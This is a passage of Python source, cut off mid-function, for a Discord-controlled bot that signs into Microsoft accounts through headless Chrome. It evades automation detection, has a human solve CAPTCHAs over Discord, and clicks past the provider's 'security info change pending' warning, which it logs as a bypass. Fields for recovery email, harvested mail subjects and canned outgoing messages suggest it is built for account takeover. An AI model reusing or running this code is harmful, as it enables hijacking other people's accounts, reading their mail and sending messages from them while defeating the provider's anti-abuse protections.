import discord
from discord.ext import commands
import asyncio
import sys
import time
import random
import re
import hashlib
import os
import tempfile
import shutil
import subprocess
import json
import io
from PIL import Image
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import WebDriverException, TimeoutException

# Bot setup - PUT YOUR TOKEN HERE
TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"  # ← REPLACE WITH YOUR BOT TOKEN

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# Store active user sessions
active_sessions = {}
# Store CAPTCHA sessions
captcha_sessions = {}

class CPUIntensiveProcessor:
    """CPU intensive operations for human-like behavior"""
    
    @staticmethod
    def hash_operations(data, iterations=5000):
        """Perform CPU-intensive hashing operations"""
        result = data
        for _ in range(iterations):
            result = hashlib.sha256(result.encode()).hexdigest()
        return result

    @staticmethod
    def mathematical_operations(base_num=12345, iterations=25000):
        """CPU-intensive mathematical calculations"""
        result = base_num
        for i in range(iterations):
            result = (result * 7) % 1000000
            result = result ** 2 % 999999
            result = int(result ** 0.5)
        return result

class ChromeDriverManager:
    """Manages Chrome and ChromeDriver installation for VPS"""
    
    @staticmethod
    def install_chrome():
        """Install Chrome on VPS"""
        print("🔧 Installing Chrome on VPS...")
        commands = [
            "sudo apt update",
            "sudo apt install -y wget unzip curl gnupg ca-certificates",
            "wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -",
            "sudo sh -c 'echo \"deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main\" > /etc/apt/sources.list.d/google-chrome.list'",
            "sudo apt update",
            "sudo apt install -y google-chrome-stable"
        ]
        
        for cmd in commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
                if result.returncode != 0:
                    print(f"⚠️ Command had issues: {cmd}")
                    print(f"Output: {result.stderr}")
            except Exception as e:
                print(f"⚠️ Error executing command: {e}")
        
        print("✅ Chrome installation attempted")
        return True
    
    @staticmethod
    def install_chromedriver():
        """Install ChromeDriver on VPS"""
        print("📥 Installing ChromeDriver...")
        
        # Get Chrome version
        try:
            chrome_version_result = subprocess.run(
                "google-chrome --version | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'",
                shell=True, capture_output=True, text=True
            )
            chrome_version = chrome_version_result.stdout.strip().split('.')[0]
            print(f"📊 Chrome major version: {chrome_version}")
            
            # Get matching ChromeDriver
            import requests
            response = requests.get(f"https://chromedriver.storage.googleapis.com/LATEST_RELEASE_{chrome_version}")
            if response.status_code == 200:
                driver_version = response.text.strip()
                print(f"📊 Matching ChromeDriver version: {driver_version}")
                
                commands = [
                    f"wget -q https://chromedriver.storage.googleapis.com/{driver_version}/chromedriver_linux64.zip",
                    "unzip -q chromedriver_linux64.zip",
                    "sudo mv chromedriver /usr/local/bin/chromedriver",
                    "sudo chmod +x /usr/local/bin/chromedriver",
                    "rm -f chromedriver_linux64.zip"
                ]
                
                for cmd in commands:
                    try:
                        subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                    except:
                        continue
        except Exception as e:
            print(f"⚠️ Error with specific version: {e}")
            # Fallback to latest
            try:
                commands = [
                    "wget -q https://storage.googleapis.com/chrome-for-testing-public/latest/linux64/chromedriver-linux64.zip",
                    "unzip -q chromedriver-linux64.zip",
                    "sudo mv chromedriver-linux64/chromedriver /usr/local/bin/chromedriver",
                    "sudo chmod +x /usr/local/bin/chromedriver",
                    "rm -rf chromedriver-linux64.zip chromedriver-linux64"
                ]
                
                for cmd in commands:
                    try:
                        subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
                    except:
                        continue
            except Exception as e2:
                print(f"❌ ChromeDriver installation failed: {e2}")
                return False
        
        print("✅ ChromeDriver installed")
        return True
    
    @staticmethod
    def check_installation():
        """Check if Chrome and ChromeDriver are installed"""
        try:
            # Check Chrome
            chrome_result = subprocess.run("which google-chrome", shell=True, capture_output=True, text=True)
            chromedriver_result = subprocess.run("which chromedriver", shell=True, capture_output=True, text=True)
            
            chrome_installed = chrome_result.returncode == 0
            chromedriver_installed = chromedriver_result.returncode == 0
            
            if chrome_installed:
                chrome_version = subprocess.run(
                    "google-chrome --version",
                    shell=True, capture_output=True, text=True
                ).stdout.strip()
                print(f"✅ {chrome_version}")
            else:
                print("❌ Chrome is NOT installed")
                
            if chromedriver_installed:
                chromedriver_version = subprocess.run(
                    "chromedriver --version",
                    shell=True, capture_output=True, text=True
                ).stdout.strip()
                print(f"✅ {chromedriver_version}")
            else:
                print("❌ ChromeDriver is NOT installed")
            
            return chrome_installed and chromedriver_installed
        except Exception as e:
            print(f"❌ Error checking installation: {e}")
            return False

class MicrosoftAccountBot:
    def __init__(self, ctx, account_password, account_email):
        self.ctx = ctx
        self.account_password = account_password
        self.account_email = account_email
        self.first_name = "Not Available"
        self.last_name = "Not Available"
        self.dob = "Not Available"
        self.country = "Not Available"
        self.postal = ""
        self.alt_email = "Recovery_Not_Attempted"
        self.email_addr = "Not Available"
        self.cpu_processor = CPUIntensiveProcessor()
        self.executor = ThreadPoolExecutor(max_workers=2)
        self.driver = None
        self.temp_profile_dir = None
        
        # Collected emails and subjects
        self.collected_emails = []
        self.collected_subjects = []
        
        # Random subjects and messages
        self.random_subjects = [
            "Quick Question",
            "Checking In",
            "Regarding Your Account",
            "Important Update",
            "Hello from Bot"
        ]
        self.random_messages = [
            "Hope you are having a great day!",
            "Just wanted to touch base regarding something.",
            "Please disregard if this is not relevant.",
            "This is an automated message.",
            "Wishing you all the best."
        ]
    
    async def send_log(self, message):
        """Send log message to Discord"""
        try:
            if len(message) > 2000:
                message = message[:1997] + "..."
            embed = discord.Embed(
                description=f"```{message}```",
                color=discord.Color.blue()
            )
            await self.ctx.send(embed=embed)
        except:
            try:
                await self.ctx.send(f"📝 {message[:1000]}")
            except:
                pass
    
    async def send_progress(self, percentage, message):
        """Send progress update to Discord"""
        try:
            embed = discord.Embed(
                title="📊 Progress Update",
                description=f"**{percentage}%** - {message}",
                color=discord.Color.green()
            )
            await self.ctx.send(embed=embed)
        except:
            try:
                await self.ctx.send(f"📊 **{percentage}%** - {message}")
            except:
                pass
    
    async def send_error(self, error_message):
        """Send error message to Discord"""
        try:
            error_msg = str(error_message)[:500]
            embed = discord.Embed(
                title="❌ Error",
                description=f"```{error_msg}```",
                color=discord.Color.red()
            )
            await self.ctx.send(embed=embed)
        except:
            try:
                await self.ctx.send(f"❌ **Error:** {error_message[:500]}")
            except:
                pass
    
    async def send_success(self, message):
        """Send success message to Discord"""
        try:
            embed = discord.Embed(
                title="✅ Success",
                description=message,
                color=discord.Color.green()
            )
            await self.ctx.send(embed=embed)
        except:
            try:
                await self.ctx.send(f"✅ {message}")
            except:
                pass
    
    def cpu_intensive_delay(self, min_s=1.0, max_s=2.0):
        """Human-like delay with CPU-intensive background processing"""
        delay_time = random.uniform(min_s, max_s)
        futures = []
        for _ in range(2):
            future = self.executor.submit(self.cpu_processor.mathematical_operations)
            futures.append(future)
        time.sleep(delay_time)
        for future in futures:
            try:
                future.result(timeout=0.1)
            except:
                pass
    
    def _human_like_type(self, element, text, min_char_delay=0.05, max_char_delay=0.15):
        """Types text into an element character by character with human-like delays."""
        try:
            element.clear()
            time.sleep(0.5)
            
            actions = ActionChains(self.driver)
            for char in text:
                actions.send_keys(char).perform()
                time.sleep(random.uniform(min_char_delay, max_char_delay))
            time.sleep(random.uniform(0.5, 1.0))
        except:
            # Fallback: send keys directly
            element.send_keys(text)
            time.sleep(random.uniform(1, 2))
    
    def _initialize_driver(self):
        """Initializes the Selenium WebDriver with VPS-compatible options"""
        try:
            # Create temp directory
            self.temp_profile_dir = tempfile.mkdtemp()
            
            # Setup Chrome options for VPS
            options = Options()
            
            # Essential VPS arguments
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-gpu")
            options.add_argument("--remote-debugging-port=9222")
            
            # Headless mode for VPS
            options.add_argument("--headless=new")
            
            # Browser configuration
            options.add_argument("--incognito")
            options.add_argument("--window-size=1920,1080")
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
            options.add_experimental_option('useAutomationExtension', False)
            
            # Disable extensions and plugins
            options.add_argument("--disable-extensions")
            options.add_argument("--disable-plugins")
            options.add_argument("--disable-popup-blocking")
            
            # Performance optimizations
            options.add_argument("--disable-software-rasterizer")
            options.add_argument("--no-first-run")
            options.add_argument("--no-default-browser-check")
            options.add_argument("--disable-web-security")
            options.add_argument("--allow-running-insecure-content")
            
            # User agent
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
            random_user_agent = random.choice(user_agents)
            options.add_argument(f"user-agent={random_user_agent}")
            
            # Set Chrome binary location
            chrome_paths = [
                "/usr/bin/google-chrome-stable",
                "/usr/bin/google-chrome",
                "/usr/bin/chromium-browser",
                "/usr/bin/chromium"
            ]
            
            for path in chrome_paths:
                if os.path.exists(path):
                    options.binary_location = path
                    print(f"✅ Found Chrome at: {path}")
                    break
            
            # Set up service
            service = None
            chromedriver_paths = [
                "/usr/local/bin/chromedriver",
                "/usr/bin/chromedriver",
                "/usr/lib/chromium-browser/chromedriver"
            ]
            
            for path in chromedriver_paths:
                if os.path.exists(path):
                    service = Service(executable_path=path)
                    print(f"✅ Found ChromeDriver at: {path}")
                    break
            
            # Try to initialize driver
            print("🚀 Initializing Chrome driver...")
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if service:
                        self.driver = webdriver.Chrome(service=service, options=options)
                    else:
                        # Try without service path
                        self.driver = webdriver.Chrome(options=options)
                    
                    # Set page load timeout
                    self.driver.set_page_load_timeout(30)
                    self.driver.implicitly_wait(15)
                    
                    print("✅ Chrome driver initialized successfully")
                    return True
                    
                except Exception as e:
                    if attempt < max_retries - 1:
                        print(f"⚠️ Attempt {attempt + 1} failed: {str(e)[:100]}")
                        time.sleep(2)
                    else:
                        raise e
                        
        except Exception as e:
            print(f"❌ Failed to initialize Chrome driver after retries: {str(e)}")
            return False
    
    async def take_screenshot(self, element=None):
        """Take a screenshot and send to Discord"""
        try:
            screenshot_path = f"/tmp/screenshot_{int(time.time())}.png"
            
            if element:
                # Take screenshot of specific element
                element.screenshot(screenshot_path)
            else:
                # Take full page screenshot
                self.driver.save_screenshot(screenshot_path)
            
            # Check if file exists and is not empty
            if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
                file = discord.File(screenshot_path, filename="screenshot.png")
                embed = discord.Embed(
                    title="📸 Browser Screenshot",
                    description=f"Current URL: {self.driver.current_url[:100]}",
                    color=discord.Color.blue()
                )
                embed.set_image(url="attachment://screenshot.png")
                await self.ctx.send(embed=embed, file=file)
                
                # Clean up
                os.remove(screenshot_path)
                return True
            else:
                await self.send_error("Failed to capture screenshot")
                return False
        except Exception as e:
            await self.send_error(f"Screenshot error: {str(e)[:200]}")
            return False
    
    async def capture_captcha(self):
        """Capture and send CAPTCHA image to Discord"""
        try:
            await self.send_log("🔍 Looking for CAPTCHA image...")
            
            # Find CAPTCHA image element
            captcha_selectors = [
                (By.XPATH, "//img[contains(@src, 'captcha') or contains(@alt, 'captcha') or contains(@alt, 'CAPTCHA')]"),
                (By.XPATH, "//img[contains(@id, 'captcha')]"),
                (By.XPATH, "//img[contains(@class, 'captcha')]"),
                (By.XPATH, "//div[contains(@id, 'captcha')]//img"),
                (By.XPATH, "//*[contains(text(), 'Enter the characters you see')]/following::img[1]"),
                (By.XPATH, "//*[contains(text(), 'characters you see')]/following::img[1]"),
            ]
            
            captcha_element = None
            for selector_type, selector_value in captcha_selectors:
                try:
                    elements = self.driver.find_elements(selector_type, selector_value)
                    for element in elements:
                        if element.is_displayed():
                            captcha_element = element
                            await self.send_log(f"✅ Found CAPTCHA element using {selector_type}")
                            break
                    if captcha_element:
                        break
                except:
                    continue
            
            if not captcha_element:
                # Try to find any image that might be CAPTCHA
                all_images = self.driver.find_elements(By.TAG_NAME, "img")
                for img in all_images:
                    try:
                        if img.is_displayed():
                            # Check if image looks like CAPTCHA (has width/height typical for CAPTCHA)
                            width = img.size['width']
                            height = img.size['height']
                            if 100 <= width <= 300 and 50 <= height <= 100:
                                captcha_element = img
                                await self.send_log("✅ Found possible CAPTCHA image by dimensions")
                                break
                    except:
                        continue
            
            if captcha_element:
                # Take screenshot of CAPTCHA element
                screenshot_path = f"/tmp/captcha_{int(time.time())}.png"
                captcha_element.screenshot(screenshot_path)
                
                # Crop if needed
                try:
                    img = Image.open(screenshot_path)
                    width, height = img.size
                    
                    # Crop to focus on CAPTCHA (remove potential borders)
                    left = 10
                    top = 10
                    right = width - 10
                    bottom = height - 10
                    
                    if right > left and bottom > top:
                        cropped_img = img.crop((left, top, right, bottom))
                        cropped_img.save(screenshot_path)
                except:
                    pass
                
                # Send to Discord
                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
                    file = discord.File(screenshot_path, filename="captcha.png")
                    embed = discord.Embed(
                        title="🔤 CAPTCHA Detected",
                        description="**Please solve this CAPTCHA:**\n\n1. Type the characters you see in the image\n2. Send the characters as a message\n3. The bot will continue automatically\n\n**Note:** The CAPTCHA is case-sensitive!",
                        color=discord.Color.orange()
                    )
                    embed.set_image(url="attachment://captcha.png")
                    embed.set_footer(text="You have 120 seconds to solve the CAPTCHA")
                    await self.ctx.send(embed=embed, file=file)
                    
                    # Store CAPTCHA session
                    captcha_sessions[self.ctx.author.id] = {
                        'bot': self,
                        'time': time.time()
                    }
                    
                    # Clean up
                    os.remove(screenshot_path)
                    return True
                else:
                    await self.send_error("Failed to capture CAPTCHA image")
                    return False
            else:
                await self.send_log("⚠️ No CAPTCHA image found. Trying to find CAPTCHA input field...")
                # Check if there's a CAPTCHA input field
                captcha_input_selectors = [
                    (By.XPATH, "//input[contains(@placeholder, 'characters')]"),
                    (By.XPATH, "//input[contains(@name, 'captcha')]"),
                    (By.XPATH, "//input[contains(@id, 'captcha')]"),
                    (By.XPATH, "//input[@type='text' and contains(@placeholder, 'enter')]"),
                ]
                
                for selector_type, selector_value in captcha_input_selectors:
                    try:
                        input_field = self.driver.find_element(selector_type, selector_value)
                        if input_field.is_displayed():
                            await self.send_log(f"✅ Found CAPTCHA input field using {selector_type}")
                            # Take screenshot of the area around the input field
                            await self.take_screenshot()
                            await self.send_log("📸 Sent screenshot of CAPTCHA area")
                            return True
                    except:
                        continue
                
                await self.send_log("⚠️ No CAPTCHA elements found")
                return False
                
        except Exception as e:
            await self.send_error(f"Error capturing CAPTCHA: {str(e)[:200]}")
            return False
    
    async def wait_for_captcha_solution(self):
        """Wait for user to solve CAPTCHA"""
        try:
            await self.send_log("⏳ Waiting for CAPTCHA solution... (120 seconds timeout)")
            
            def check(m):
                return m.author == self.ctx.author and m.channel == self.ctx.channel and not m.content.startswith('!')
            
            try:
                # Wait for user to send CAPTCHA solution
                captcha_msg = await bot.wait_for('message', check=check, timeout=120)
                captcha_text = captcha_msg.content.strip()
                
                if captcha_text:
                    await self.send_log(f"✅ CAPTCHA received: {captcha_text}")
                    return captcha_text
                else:
                    await self.send_error("❌ Empty CAPTCHA received")
                    return None
                    
            except asyncio.TimeoutError:
                await self.send_error("❌ CAPTCHA timeout! No solution received in 120 seconds")
                # Clean up CAPTCHA session
                if self.ctx.author.id in captcha_sessions:
                    del captcha_sessions[self.ctx.author.id]
                return None
                
        except Exception as e:
            await self.send_error(f"Error waiting for CAPTCHA: {str(e)[:200]}")
            return None
    
    def close_browser(self):
        """Closes the browser and cleans up"""
        if self.driver:
            try:
                self.driver.quit()
                print("✅ Browser closed")
            except:
                print("⚠️ Error closing browser")
            self.driver = None
        
        if self.temp_profile_dir and os.path.exists(self.temp_profile_dir):
            try:
                shutil.rmtree(self.temp_profile_dir, ignore_errors=True)
                print("✅ Temp directory cleaned")
            except:
                print("⚠️ Error cleaning temp directory")
        
        self.executor.shutdown(wait=True)
        print("✅ Executor shutdown")
    
    async def handle_other_ways_to_sign_in(self):
        """Handle the 'Other ways to sign in' option when password field is not found"""
        try:
            await self.send_log("🔍 Looking for 'Other ways to sign in' link...")
            
            # Look for "other ways to sign in" text in various forms
            other_ways_selectors = [
                (By.XPATH, "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other ways to sign in')]"),
                (By.XPATH, "//span[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other ways to sign in')]"),
                (By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other ways to sign in')]"),
                (By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other ways to sign in')]"),
                (By.XPATH, "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'other ways to sign in')]"),
            ]
            
            other_ways_element = None
            for selector_type, selector_value in other_ways_selectors:
                try:
                    elements = self.driver.find_elements(selector_type, selector_value)
                    for element in elements:
                        if element.is_displayed() and element.is_enabled():
                            other_ways_element = element
                            await self.send_log(f"✅ Found 'Other ways to sign in' using {selector_type}")
                            break
                    if other_ways_element:
                        break
                except:
                    continue
            
            if other_ways_element:
                # Click on "Other ways to sign in"
                other_ways_element.click()
                await self.send_log("✅ Clicked 'Other ways to sign in'")
                time.sleep(2)
                
                # Take screenshot after clicking
                await self.take_screenshot()
                
                # Now look for "Use your password" option
                await self.send_log("🔍 Looking for password option...")
                
                password_option_selectors = [
                    (By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use your password')]"),
                    (By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use your password')]"),
                    (By.XPATH, "//span[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use your password')]"),
                    (By.XPATH, "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use your password')]"),
                    (By.XPATH, "//*[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password') and contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use')]"),
                ]
                
                password_option = None
                for selector_type, selector_value in password_option_selectors:
                    try:
                        elements = self.driver.find_elements(selector_type, selector_value)
                        for element in elements:
                            if element.is_displayed() and element.is_enabled():
                                password_option = element
                                await self.send_log(f"✅ Found password option using {selector_type}")
                                break
                        if password_option:
                            break
                    except:
                        continue
                
                if password_option:
                    password_option.click()
                    await self.send_log("✅ Clicked 'Use your password' option")
                    time.sleep(3)
                    
                    # Take screenshot after selecting password option
                    await self.take_screenshot()
                    return True
                else:
                    await self.send_log("⚠️ Could not find 'Use your password' option")
                    return False
            else:
                await self.send_log("⚠️ Could not find 'Other ways to sign in' link")
                return False
                
        except Exception as e:
            await self.send_error(f"Error handling 'Other ways to sign in': {str(e)[:200]}")
            return False
    
    async def find_and_fill_password_field(self):
        """Find and fill the password field after clicking through other options"""
        try:
            await self.send_log("🔍 Searching for password field...")
            
            password_selectors = [
                (By.ID, "i0118"),
                (By.NAME, "passwd"),
                (By.XPATH, "//input[@type='password']"),
                (By.XPATH, "//input[contains(@placeholder, 'password')]"),
                (By.XPATH, "//input[contains(@name, 'Password')]"),
                (By.XPATH, "//input[contains(@id, 'password')]"),
            ]
            
            password_field = None
            for selector_type, selector_value in password_selectors:
                try:
                    password_field = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((selector_type, selector_value))
                    )
                    if password_field:
                        await self.send_log(f"✅ Found password field using {selector_type}")
                        break
                except:
                    continue
            
            if password_field:
                # Type password
                await self.send_log("🔑 Entering password...")
                try:
                    self._human_like_type(password_field, self.account_password)
                except:
                    password_field.send_keys(self.account_password)
                
                # Find Sign in button
                signin_buttons = [
                    (By.ID, "idSIButton9"),
                    (By.XPATH, "//input[@type='submit' and @value='Sign in']"),
                    (By.XPATH, "//input[@value='Sign in']"),
                    (By.XPATH, "//button[contains(text(), 'Sign in')]"),
                    (By.XPATH, "//button[@type='submit']")
                ]
                
                signin_clicked = False
                for selector_type, selector_value in signin_buttons:
                    try:
                        button = self.driver.find_element(selector_type, selector_value)
                        if button.is_displayed() and button.is_enabled():
                            button.click()
                            await self.send_log(f"✅ Clicked Sign in button using {selector_type}")
                            signin_clicked = True
                            break
                    except:
                        continue
                
                if not signin_clicked:
                    # Try pressing Enter
                    try:
                        actions = ActionChains(self.driver)
                        actions.send_keys(Keys.ENTER).perform()
                        await self.send_log("✅ Pressed Enter to sign in")
                    except:
                        pass
                
                return True
            else:
                await self.send_log("❌ Could not find password field after trying all methods")
                return False
                
        except Exception as e:
            await self.send_error(f"Error finding password field: {str(e)[:200]}")
            return False

    async def handle_security_change_notification(self):
        """Detect and handle the security info change notification screen"""
        try:
            await self.send_log("🔍 Checking for security info change notification...")
            
            # Get current page content
            page_source = self.driver.page_source.lower()
            
            # Check for keywords from the security notification
            security_keywords = [
                "security info change is still pending",
                "security info be replaced",
                "current security info",
                "alternate email",
                "waiting period",
                "your security info will be replaced",
                "let us know",
                "keep your current security info"
            ]
            
            # Check if any of these keywords appear in the page
            has_security_notice = any(keyword in page_source for keyword in security_keywords)
            
            if has_security_notice:
                await self.send_log("⚠️ Security info change notification detected!")
                await self.take_screenshot()
                
                # Look for the "Next" button - multiple strategies
                next_selectors = [
                    (By.XPATH, "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'next')]"),
                    (By.XPATH, "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'next')]"),
                    (By.XPATH, "//input[contains(translate(@value, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'next')]"),
                    (By.XPATH, "//span[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'next')]"),
                    (By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'next')]"),
                    (By.XPATH, "//*[@id='idSIButton9']"),  # Common Microsoft button ID
                    (By.XPATH, "//*[text()='Next']"),  # Exact text match
                    (By.XPATH, "//a[text()='Next']"),
                    (By.XPATH, "//button[text()='Next']"),
                    (By.XPATH, "//input[@value='Next']"),
                    (By.XPATH, "//a[contains(@class, 'button')]"),  # Generic button
                    (By.XPATH, "//button[contains(@class, 'button')]"),
                    (By.XPATH, "//input[@type='submit']"),  # Submit button
                ]
                
                next_button = None
                for selector_type, selector_value in next_selectors:
                    try:
                        elements = self.driver.find_elements(selector_type, selector_value)
                        for element in elements:
                            try:
                                if element.is_displayed() and element.is_enabled():
                                    next_button = element
                                    await self.send_log(f"✅ Found Next button using {selector_type}")
                                    break
                            except:
                                continue
                        if next_button:
                            break
                    except:
                        continue
                
                if next_button:
                    # Scroll to the button if needed
                    self.driver.execute_script("arguments[0].scrollIntoView(true);", next_button)
                    time.sleep(1)
                    
                    # Take screenshot of the button before clicking
                    await self.take_screenshot(next_button)
                    
                    # Click the Next button
                    try:
                        next_button.click()
                        await self.send_log("✅ Clicked Next button on security notification")
                    except:
                        # Try JavaScript click as fallback
                        self.driver.execute_script("arguments[0].click();", next_button)
                        await self.send_log("✅ Clicked Next button using JavaScript")
                    
                    # Wait for page to load
                    time.sleep(3)
                    
                    # Take screenshot after clicking
                    await self.take_screenshot()
                    
                    await self.send_log("✅ Successfully bypassed security info change notification")
                    return True
                else:
                    await self.send_log("⚠️ Could not find Next button on security notification")
                    
                    # Try pressing Enter as fallback
                    try:
                        actions = ActionChains(self.driver)
                        actions.send_keys(Keys.ENTER).perform()
                        await self.send_log("✅ Pressed Enter to proceed")
                        time.sleep(3)
                        await self.take_screenshot()
                        return True
                    except:
                        await self.send_log("❌ Could not proceed past security notification")
                        return False
            else:
                await self.send_log("✅ No security info change notification found")
                return True
                
        except Exception as e:
            await self.send_error(f"Error handling security notification: {str(e)[:200]}")
            return True  # Continue anyway
    
    async def perform_automatic_login(self):
        """Performs automatic login with provided email and password"""
        await self.send_progress(15, "Starting automatic login...")
        
        try:
            # Go to Microsoft login
            self.driver.get("https://login.live.com/")
            await self.send_log("🌐 Opened Microsoft login page")
            
            # Wait a bit for page to load
            time.sleep(3)
            
            # Take initial screenshot
            await self.take_screenshot()
            
            # Find email field with multiple selectors
            email_selectors = [
                (By.ID, "i0116"),
                (By.NAME, "loginfmt"),
                (By.XPATH, "//input[@type='email']"),
                (By.XPATH, "//input[contains(@placeholder, 'email')]")
            ]
            
            email_field = None
            for selector_type, selector_value in email_selectors:
                try:
                    email_field = WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((selector_type, selector_value))
                    )
                    if email_field:
                        await self.send_log(f"✅ Found email field using {selector_type}")
                        break
                except:
                    continue
            
            if not email_field:
                await self.send_error("❌ Could not find email field")
                await self.take_screenshot()
                return False
            
            # Type email
            await self.send_log(f"📧 Entering email: {self.account_email}")
            try:
                self._human_like_type(email_field, self.account_email)
            except:
                email_field.send_keys(self.account_email)
            
            # Find Next/Sign in button
            next_buttons = [
                (By.ID, "idSIButton9"),
                (By.XPATH, "//input[@type='submit' and @value='Next']"),
                (By.XPATH, "//input[@value='Next']"),
                (By.XPATH, "//button[contains(text(), 'Next')]"),
                (By.XPATH, "//button[contains(text(), 'Sign in')]"),
                (By.XPATH, "//input[@type='submit']")
            ]
            
            button_clicked = False
            for selector_type, selector_value in next_buttons:
                try:
                    button = self.driver.find_element(selector_type, selector_value)
                    if button.is_displayed() and button.is_enabled():
                        button.click()
                        await self.send_log(f"✅ Clicked button using {selector_type}")
                        button_clicked = True
                        break
                except:
                    continue
            
            if not button_clicked:
                # Try pressing Enter
                try:
                    actions = ActionChains(self.driver)
                    actions.send_keys(Keys.ENTER).perform()
                    await self.send_log("✅ Pressed Enter to continue")
                except:
                    pass
            
            # Wait for password field
            await self.send_log("⏳ Waiting for password field...")
            time.sleep(3)
            
            # Take screenshot before looking for password
            await self.take_screenshot()
            
            # FIRST ATTEMPT: Try to find password field directly
            password_found = False
            password_selectors = [
                (By.ID, "i0118"),
                (By.NAME, "passwd"),
                (By.XPATH, "//input[@type='password']"),
                (By.XPATH, "//input[contains(@placeholder, 'password')]"),
            ]
            
            for selector_type, selector_value in password_selectors:
                try:
                    password_field = WebDriverWait(self.driver, 5).until(
                        EC.presence_of_element_located((selector_type, selector_value))
                    )
                    if password_field:
                        await self.send_log(f"✅ Found password field directly using {selector_type}")
                        password_found = True
                        
                        # Type password
                        await self.send_log("🔑 Entering password...")
                        try:
                            self._human_like_type(password_field, self.account_password)
                        except:
                            password_field.send_keys(self.account_password)
                        
                        # Find Sign in button
                        signin_buttons = [
                            (By.ID, "idSIButton9"),
                            (By.XPATH, "//input[@type='submit' and @value='Sign in']"),
                            (By.XPATH, "//input[@value='Sign in']"),
                            (By.XPATH, "//button[contains(text(), 'Sign in')]"),
                            (By.XPATH, "//button[@type='submit']")
                        ]
                        
                        signin_clicked = False
                        for signin_selector_type, signin_selector_value in signin_buttons:
                            try:
                                button = self.driver.find_element(signin_selector_type, signin_selector_value)
                                if button.is_displayed() and button.is_enabled():
                                    button.click()
                                    await self.send_log(f"✅ Clicked Sign in button using {signin_selector_type}")
                                    signin_clicked = True
                                    break
                            except:
                                continue
                        
                        if not signin_clicked:
                            # Try pressing Enter
                            try:
                                actions = ActionChains(self.driver)
                                actions.send_keys(Keys.ENTER).perform()
                                await self.send_log("✅ Pressed Enter to sign in")
                            except:
                                pass
                        
                        break
                except:
                    continue
            
            # SECOND ATTEMPT: If password field not found, try "Other ways to sign in"
            if not password_found:
                await self.send_log("⚠️ Password field not found directly. Trying 'Other ways to sign in'...")
                
                # Handle "Other ways to sign in"
                if await self.handle_other_ways_to_sign_in():
                    # Now try to find and fill password field
                    if await self.find_and_fill_password_field():
                        password_found = True
                    else:
                        await self.send_error("❌ Failed to find password field after 'Other ways to sign in'")
                else:
                    await self.send_error("❌ Failed to handle 'Other ways to sign in'")
            
            # Wait for login to complete
            await self.send_log("⏳ Waiting for login to complete...")
            time.sleep(5)
            
            # Take screenshot after login attempt
            await self.take_screenshot()
            
            # Check for security info change notification
            await self.handle_security_change_notification()
            
            # Check if login was successful
            current_url = self.driver.current_url
            success_urls = [
                "account.microsoft.com",
